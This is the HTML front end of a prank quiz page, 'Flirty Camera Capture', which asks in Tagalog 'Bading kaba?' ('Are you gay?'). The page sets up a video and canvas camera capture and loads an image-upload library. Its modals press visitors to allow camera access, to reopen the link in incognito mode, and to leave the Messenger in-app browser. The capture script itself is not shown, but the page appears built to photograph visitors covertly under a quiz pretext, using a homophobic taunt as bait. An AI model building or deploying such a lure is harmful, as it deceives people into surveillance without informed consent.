<!DOCTYPE html>
<html>
<head>
  <title>Flirty Camera Capture</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
  <div class="container">
    <h1>Bading kaba? </h1>
    <div class="camera-container">
      <video id="video" width="640" height="480" autoplay></video>
      <canvas id="canvas" width="640" height="480"></canvas>
    </div>
    <div class="link-boxes">
      <a href="#" class="link-box" data-redirect-url="https://dodongcharingmodelngperla.wordpress.com/wp-content/uploads/2014/12/20141203-204441-74681162.jpg?w=660">Minsan</a>
      <a href="#" class="link-box" data-redirect-url="https://i.pinimg.com/originals/16/c8/ec/16c8ecc89cee58e833f09fdf9d24870d.jpg">Oo </a>
      <a href="#" class="link-box" data-redirect-url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQLo78kDxzlS53eYO4oQ7X2cKE4Jo46r1Mkg&s">Hindi</a>
    </div>
  </div>

  <div id="cameraModal" class="modal">
    <div class="modal-content">
      <h2>You didn't Click allow</h2>
   
      <img src="https://png.pngtree.com/png-vector/20190115/ourmid/pngtree-sad-depressed-and-sad-emoticon-with-tear-on-face-png-image_317660.jpg" alt="Sad Emoji" style="width: 50%; height: auto;">
      <p>Open mo link sa incognito mode tapos click mo allow</p>
      <button id="retryCamera">Retry</button>
    </div>
  </div>

  <div id="messengerModal" class="modal">
    <div class="modal-content">
      <h2>⚠️ Please Open in Browser ⚠️</h2>
      <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" alt="Browser Icon" style="width: 100px; margin: 20px 0;">
      <p>For best experience:</p>
      <ol style="text-align: left; margin: 15px 20%;">
        <li>Tap the 3 dots (...) in top right</li>
        <li>Select "Open in Browser"</li>
        <li>Allow camera access when prompted</li>
      </ol>
      <button onclick="closeMessengerModal()">I've Opened in Browser</button>
    </div>
  </div>

  <script src="https://unpkg.com/cloudinary-core/cloudinary-core-shrinkwrap.min.js"></script>
  <script src="script.js"></script>
</body>
</html>
